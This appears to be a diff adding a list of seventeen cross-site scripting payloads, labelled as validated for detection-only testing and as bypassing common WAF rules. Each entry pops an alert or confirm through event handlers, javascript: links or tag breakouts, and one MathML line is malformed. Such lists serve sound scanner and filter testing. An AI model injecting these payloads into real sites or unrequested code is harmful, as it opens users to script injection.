@@ -1,0 +1,17 @@
+# Curated XSS payloads — validated for safe detection-only testing
+# These bypass common WAF rules without causing harm
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<details open ontoggle=alert(1)>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+javascript:alert(1)
+<img src=x onerror=confirm(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<svg><script>alert(1)</script>
+<math><mi><xlink:href="javascript:alert(1)">click</mi></math>
+<a href="javascript:alert(1)">click</a>
